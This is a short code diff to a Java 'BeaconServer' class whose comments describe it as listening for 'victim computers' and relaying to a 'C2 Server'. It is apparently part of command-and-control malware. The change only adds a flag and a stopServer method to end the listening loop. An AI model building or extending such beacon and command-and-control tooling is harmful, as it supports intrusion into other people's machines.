@@ -25,6 +25,10 @@ public class BeaconServer implements Runnable{
     // Socket that is listentning for connections from clients (victim computers)
     private ServerSocket serverSocket;
 
+    // Boolean to determine if server should remain running
+    private boolean sentinel = true;
+
+
     /**
      * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
      * back to the C2 Server.
@@ -246,13 +250,17 @@ public class BeaconServer implements Runnable{
         return clientStatus;
     }
 
+    protected void stopServer(){
+        sentinel = false; 
+    }
+
     @Override
     public void run(){
         // Start the thread that interacts with the C2 Server
         Thread C2HandlerThread = new Thread(C2Handler);
         C2HandlerThread.start();
         // Always listening for clients
-        while(true){
+        while(sentinel){
             try{
                 // Accept new client
                 Socket socket = serverSocket.accept();
